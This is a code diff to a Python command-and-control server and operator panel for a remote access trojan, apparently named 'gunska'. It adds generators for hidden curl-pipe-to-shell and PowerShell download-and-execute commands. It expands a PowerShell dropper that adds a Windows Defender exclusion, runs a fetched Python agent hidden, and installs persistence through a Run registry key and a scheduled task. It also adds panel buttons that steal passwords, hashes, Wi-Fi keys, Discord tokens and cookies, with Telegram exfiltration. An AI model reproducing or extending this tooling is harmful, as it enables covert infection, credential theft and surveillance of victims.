@@ -11,8 +11,27 @@ from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
 from urllib.parse import parse_qs, urlparse
 
 PORT = int(os.environ.get("PORT", "8080"))
-AUTH = os.environ.get("AUTH") or secrets.token_hex(12)
-TOKEN = os.environ.get("AGENT_TOKEN") or secrets.token_hex(12)
+HERE = os.path.dirname(os.path.abspath(__file__))
+STATE = os.path.join(HERE, "state.json")
+
+
+def _state():
+    try:
+        return json.load(open(STATE))
+    except Exception:
+        return {}
+
+
+def _save_state():
+    try:
+        json.dump({"auth": AUTH, "token": TOKEN}, open(STATE, "w"))
+    except Exception:
+        pass
+
+
+_st = _state()
+AUTH = os.environ.get("AUTH") or _st.get("auth") or secrets.token_hex(12)
+TOKEN = os.environ.get("AGENT_TOKEN") or _st.get("token") or secrets.token_hex(12)
 BASE = os.environ.get("BASE_URL", "https://1uciferxyz.com").rstrip("/")
 TG_TOKEN = os.environ.get("TG_TOKEN") or ""
 TG_CHAT = os.environ.get("TG_CHAT") or ""
@@ -43,6 +62,16 @@ def base_of(h):
     return "%s://%s" % (proto, h.headers.get("Host", "localhost"))
 
 
+def links(o):
+    return {
+        "linux": "curl -fsSL %s/i | sh" % o,
+        "windows": ('powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c '
+                    '"1..5|%%{try{irm %s/i.ps1|iex;break}catch{Start-Sleep 3}}"' % o).replace("%%", "%"),
+        "windows_simple": ('powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c '
+                           '"irm %s/i.ps1 | iex"' % o),
+    }
+
+
 def sess(sid):
     with LOCK:
         s = S.get(sid)
@@ -53,8 +82,8 @@ def sess(sid):
 
 
 AGENT = ""
-if os.path.exists("agent.py"):
-    with open("agent.py", encoding="utf-8") as _f:
+if os.path.exists(os.path.join(HERE, "agent.py")):
+    with open(os.path.join(HERE, "agent.py"), encoding="utf-8") as _f:
         AGENT = _f.read()
 
 
@@ -68,7 +97,7 @@ def agent_src(host):
 
 SIMPLE = {"info", "ps", "shot", "cam", "pwd", "steal", "grab", "persist",
           "unpersist", "sd", "kill", "py", "toast", "vibrate", "audio", "leave",
-          "tg", "cookies", "tokens", "passwords"}
+          "tg", "all", "cookies", "tokens", "passwords", "hash", "wifi", "discord"}
 
 
 def to_agent(line):
@@ -121,52 +150,81 @@ fi
 echo "[+] done"
 """
 
-PSH = r"""$ErrorActionPreference="Stop"
+PSH = r"""$ErrorActionPreference="Continue"
 $ProgressPreference="SilentlyContinue"
+try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13}catch{}
 try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
 $B="__B__"; $d="$env:LOCALAPPDATA\svc"; $ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 New-Item -ItemType Directory -Force $d | Out-Null
 $log="$d\boot.log"
+$fatal=$null
 function Log($m){ try{ Add-Content -Path $log -Value ((Get-Date -Format "HH:mm:ss")+" "+$m) }catch{} }
+function Pop($m){
+  try{
+    Add-Type -AssemblyName System.Windows.Forms
+    $t=$m; if(Test-Path $log){ $t="$m`r`n`r`n"+((Get-Content $log -Tail 12) -join "`r`n") }
+    [System.Windows.Forms.MessageBox]::Show($t,"gunska","OK","Warning") | Out-Null
+  }catch{}
+}
+function Die($m){ Log "FATAL $m"; Pop $m; throw $m }
 function Get($u,$o){
-  for($i=0;$i -lt 4;$i++){
+  for($i=0;$i -lt 5;$i++){
     try{
       Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing -UserAgent $ua -TimeoutSec 90
       if((Test-Path $o) -and (Get-Item $o).Length -gt 0){ return $true }
-    }catch{ Start-Sleep -Seconds 2 }
+    }catch{ Log "get fail $i $u : $_"; Start-Sleep -Seconds 2 }
   }
   return $false
 }
 function OK($exe){
   if(-not $exe -or -not (Test-Path $exe)){ return $false }
+  # stub dyal Microsoft Store = 0 byte / reparse point -> mchkoul
+  try{
+    $it=Get-Item $exe
+    if($it.Length -eq 0 -and $exe -like "*WindowsApps*"){ Log "stub: $exe"; return $false }
+  }catch{}
   try{
     $p = Start-Process -FilePath $exe -ArgumentList '-c','print(1)' -NoNewWindow -PassThru -Wait -ErrorAction Stop
     if($p.ExitCode -eq 0){ return $true }
     Log "bad exe rc=$($p.ExitCode): $exe"
-  }catch{ Log "bad exe: $exe" }
+  }catch{ Log "bad exe: $exe : $_" }
   return $false
 }
-Log "start"
+Log "start user=$env:USERNAME admin=$([bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)))"
+try{ Add-MpPreference -ExclusionPath $d -ErrorAction Stop; Log "defender excl ok" }catch{ Log "defender excl: $_" }
+
 $py="$d\python.exe"; $have=$null
+Remove-Item "$d\.live" -Force -ErrorAction SilentlyContinue
 
 if(-not (OK $py)){
   if((Get "$B/py" "$d\py.zip") -and ((Get-Item "$d\py.zip").Length -gt 1000000)){
-    try{ Expand-Archive "$d\py.zip" $d -Force }catch{ Log "unzip: $_" }
-  }
-  if(OK $py){ $have=$py }
+    try{ Expand-Archive "$d\py.zip" $d -Force; Log "unzip ok" }catch{ Log "unzip: $_" }
+  } else { Log "py.zip fail" }
+  if(OK $py){ $have=$py; Log "embed ok" }
+}
+if(-not $have){
+  $c=(Get-Command py -ErrorAction SilentlyContinue).Source
+  if($c){ $c2 = & $c -3 -c "import sys;print(sys.executable)" 2>$null
+    if($c2 -and (OK $c2.Trim())){ $have=$c2.Trim(); Log "py-launcher: $have" } }
+}
+if(-not $have){
+  $c=(Get-Command python3 -ErrorAction SilentlyContinue).Source
+  if(OK $c){ $have=$c; Log "sys python3: $c" }
 }
 if(-not $have){
   $c=(Get-Command python -ErrorAction SilentlyContinue).Source
-  if(OK $c){ $have=$c; Log "sys: $c" }
+  if(OK $c){ $have=$c; Log "sys python: $c" }
 }
-if(-not $have){ Log "no python"; throw "python missing" }
+if(-not $have){ Die "python ma kaynch (embed + system fchlo). Chouf $log" }
 Log "python: $have"
 
-if(-not (Get "$B/a" "$d\k.py")){ Log "payload fail"; throw "payload fetch failed" }
-if((Get-Item "$d\k.py").Length -lt 500){ Log "payload short"; throw "payload corrupt" }
+if(-not (Get "$B/a" "$d\k.py")){ Die "payload fetch failed — chouf $log" }
+if((Get-Item "$d\k.py").Length -lt 500){ Die "payload corrupt" }
 
 $run="$d\run.cmd"
 Set-Content -Path $run -Encoding ASCII -Value ('@echo off'+"`r`n"+'start "" "'+$have+'" "'+"$d\k.py"+'"'+"`r`n")
+$vbs="$d\run.vbs"
+Set-Content -Path $vbs -Encoding ASCII -Value ('CreateObject("WScript.Shell").Run """'+$have+'"" ""'+"$d\k.py"+'""", 0, False')
 
 $psi = New-Object Diagnostics.ProcessStartInfo
 $psi.FileName = $have
@@ -175,18 +233,24 @@ $psi.WorkingDirectory = $d
 $psi.WindowStyle = "Hidden"
 $psi.CreateNoWindow = $true
 $psi.UseShellExecute = $false
+$psi.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8"
 $pr = [Diagnostics.Process]::Start($psi)
 Log "spawned pid=$($pr.Id)"
-Start-Sleep -Seconds 6
-if($pr.HasExited){ Log "died rc=$($pr.ExitCode)"; throw "agent exited" }
-Log "alive"
+$t0 = Get-Date
+Start-Sleep -Seconds 10
+$live = Join-Path $d ".live"
+if($pr.HasExited){ Die "agent mnat f 10s (rc=$($pr.ExitCode)). Chouf $log" }
+if(-not (Test-Path $live)){ Die "agent khdam walakin ma darch l'marker. Chouf $log" }
+Log "alive + marker ok"
 
 try{
-  New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value ('"'+$run+'"') -PropertyType String -Force | Out-Null
+  New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value ('wscript.exe //nologo "'+$vbs+'"') -PropertyType String -Force | Out-Null
   Log "run-key ok"
 }catch{ Log "run-key: $_" }
 try{ & cmd /c "schtasks /delete /tn SysSvc /f >nul 2>&1" }catch{}
-try{ & cmd /c "schtasks /create /tn SysSvc /tr ""$run"" /sc onlogon /f" | Out-Null; Log "task ok" }catch{ Log "task: $_" }
+try{ & cmd /c "schtasks /create /tn SysSvc /tr ""wscript.exe //nologo """"$vbs"""""" /sc onlogon /f" | Out-Null; Log "task ok" }catch{ Log "task: $_" }
+Log "done"
+Pop "gunska: session wjdat 3la $env:COMPUTERNAME"
 """
 
 PANEL = r"""<!doctype html>
@@ -254,7 +318,7 @@ input::placeholder{color:var(--faint)}
 
 main{flex:1; display:grid; grid-template-columns:230px minmax(0,1fr) 250px; gap:10px; padding:10px; min-height:0}
 .col{display:flex; flex-direction:column; min-height:0; background:var(--card); border:1px solid var(--line); border-radius:var(--r); overflow:hidden}
-.colhead{display:flex; align-items:center; gap:8px; padding:9px 11px; border-bottom:1px solid var(--line)}
+.colhead{display:flex; align-items:center; gap:8px; padding:9px 11px; border-bottom:1px solid var(--line); flex-wrap:wrap}
 .colhead h2{margin:0; font-size:10px; letter-spacing:.14em; text-transform:uppercase; color:var(--dim); font-weight:600}
 .badge{font-size:10px; color:var(--dim); background:var(--card2); border-radius:999px; padding:1px 7px}
 .list{overflow:auto; padding:6px; flex:1; min-height:0}
@@ -328,6 +392,10 @@ main{flex:1; display:grid; grid-template-columns:230px minmax(0,1fr) 250px; gap:
       <button class="btn xs" data-c=".tg">exfil</button>
       <button class="btn xs" data-c=".cookies">cookies</button>
       <button class="btn xs" data-c=".tokens">tokens</button>
+      <button class="btn xs" data-c=".passwords">passwords</button>
+      <button class="btn xs" data-c=".hash">hash</button>
+      <button class="btn xs" data-c=".wifi">wifi</button>
+      <button class="btn xs" data-c=".discord">discord</button>
       <button class="btn xs" data-c=".info">info</button>
       <button class="btn xs" data-c=".steal">steal</button>
       <button class="btn xs" data-c=".shot">shot</button>
@@ -503,11 +571,19 @@ async function upload(){
   $("#f").value = "";
 }
 
-function drawLinks(){
-  const o = location.origin;
+async function drawLinks(){
+  let j = null;
+  try { j = await (await api("/api/links")).json(); } catch (e) {}
+  if (!j) {
+    const o = location.origin;
+    j = {linux: "curl -fsSL " + o + "/i | sh",
+         windows: 'powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c "irm ' + o + '/i.ps1 | iex"',
+         windows_simple: ""};
+  }
   $("#links").innerHTML =
-    '<div>linux / termux</div><code>curl -fsSL ' + esc(o) + '/i | sh</code>' +
-    '<div>windows</div><code>powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c "irm ' + esc(o) + '/i.ps1 | iex"</code>';
+    '<div>linux / termux</div><code>' + esc(j.linux) + '</code>' +
+    '<div>windows (retry)</div><code>' + esc(j.windows) + '</code>' +
+    (j.windows_simple ? '<div>windows (simple)</div><code>' + esc(j.windows_simple) + '</code>' : '');
   for (const c of document.querySelectorAll(".links code")){
     c.title = "click to copy";
     c.style.cursor = "pointer";
@@ -529,6 +605,8 @@ document.addEventListener("keydown", e => {
   if (e.key === "/" && document.activeElement.tagName !== "INPUT") { e.preventDefault(); $("#search").focus(); }
 });
 
+const qk = new URLSearchParams(location.search).get("k");
+if (qk) { K = qk.trim(); localStorage.setItem("gs_key", K); history.replaceState(null, "", location.pathname); }
 $("#k").value = K;
 if (K) connect();
 </script>
@@ -578,7 +656,6 @@ class H(BaseHTTPRequestHandler):
         n = int(self.headers.get("Content-Length") or 0)
         return self.rfile.read(n) if n else b""
 
-    # ------------------------------------------------------------------ GET
     def do_GET(self):
         u = urlparse(self.path)
         p, qs = u.path, parse_qs(u.query)
@@ -599,8 +676,9 @@ class H(BaseHTTPRequestHandler):
         if p == "/link":
             if not self.auth():
                 return
-            o = base_of(self)
-            return self.snd(200, "linux:  curl -fsSL %s/i | sh\nwindows: powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c \"irm %s/i.ps1 | iex\"\n" % (o, o))
+            j = links(base_of(self))
+            return self.snd(200, "linux:  %s\nwindows: %s\nwindows_simple: %s\n"
+                            % (j["linux"], j["windows"], j["windows_simple"]))
 
         if p == "/py":
             if PYC["d"]:
@@ -638,6 +716,9 @@ class H(BaseHTTPRequestHandler):
         if p.startswith("/api/"):
             if not self.auth():
                 return
+
+            if p == "/api/links":
+                return self.snd(200, json.dumps(links(base_of(self))), "application/json")
 
             if p == "/api/sessions":
                 now = time.time()
@@ -685,7 +766,6 @@ class H(BaseHTTPRequestHandler):
     def do_HEAD(self):
         self.do_GET()
 
-    # ----------------------------------------------------------------- POST
     def do_POST(self):
         u = urlparse(self.path)
         p, qs = u.path, parse_qs(u.query)
@@ -787,6 +867,7 @@ def gc():
 
 
 if __name__ == "__main__":
+    _save_state()
     threading.Thread(target=gc, daemon=True).start()
     print("AUTH=%s\nTOKEN=%s\nTG=%s\nBASE=%s\nlistening :%d"
           % (AUTH, TOKEN, "on" if (TG_TOKEN and TG_CHAT) else "off", BASE, PORT), flush=True)
